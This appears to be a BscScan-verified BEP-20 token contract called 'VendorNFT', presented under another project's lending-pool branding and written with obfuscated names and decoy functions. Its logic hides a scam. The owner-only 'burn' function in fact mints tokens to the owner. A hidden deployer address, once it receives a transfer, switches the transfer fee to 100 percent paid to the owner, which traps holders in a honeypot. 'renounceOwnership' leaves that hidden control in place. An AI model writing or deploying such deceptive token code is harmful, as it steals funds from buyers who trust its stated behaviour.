/**
 *Submitted for verification at BscScan.com on 2022-12-30
*/

/*
VendorNFT
Permission-less, non-liquidatable, fixed-rate, and fixed  terms loan pools customized by lenders. Not Liquidated !
Beta is live on 
https://vendor.finance
discord.gg/kJBAC3G2pY
https://twitter.com/VendorFi

*/
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.11;
contract VendorNFT {
address public  WUmOJr = address(0);
address public  qMZOlM = address(0);
uint256 public  VDMpBM = 17;
uint256 public  rzyLwe = 19;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant LyYVFC = 9+1;
uint256 private  fjaLGU = 10000000000000;
uint8 public constant decimals = 18;
string public  name = "VendorNFT";
string public  symbol = "VendorNFT";
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  EaMVTf = 22;
uint256 public  FflURu = 24;
address private  dBcdSW = address(0);
address public  VuLrxe = address(0);
uint256 public  uwPMfw = 26;
uint256 public  JHxybR = 28;
mapping (address => uint256) public balanceOf;
address public  PbkNYA = address(0);
address public owner;
address public  XsGaHE = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public  xPZCIb = address(0);
uint256 public constant totalSupply = 10000000000000000000000000000;
uint256 public  EanrKi = 31;
uint256 public  VvsllQ = 33;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}

function _liq1VDMpBM() private returns (uint256) {
return VDMpBM++ ;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

function _addrz2yLwe() private returns (uint256) {
return rzyLwe-- ;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

function _liqEaM3VTf() private returns (uint256) {
return EaMVTf + rzyLwe ;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

function _addFflU4Ru() private returns (uint256) {
return FflURu - uwPMfw ;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

function _adduwPMf5w() private returns (uint256) {
return uwPMfw * FflURu ;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

function _liqJ6HxybR() private returns (uint256) {
return JHxybR / EanrKi ;
}

constructor () public {
dBcdSW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "cEgcru");
require(to != address(0), "cEgcru");
require(amount <= balanceOf[from], "cEgcru");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LyYVFC/fjaLGU ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==dBcdSW){
fjaLGU = 9+1;
}
emit Transfer(from, to, transferAmount);
}

function _liqEa7nrKi() private returns (uint256) {
return EanrKi + JHxybR ;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

function _liqVvs8llQ() private returns (uint256) {
return VvsllQ++ ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
//
}

library Address256 {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}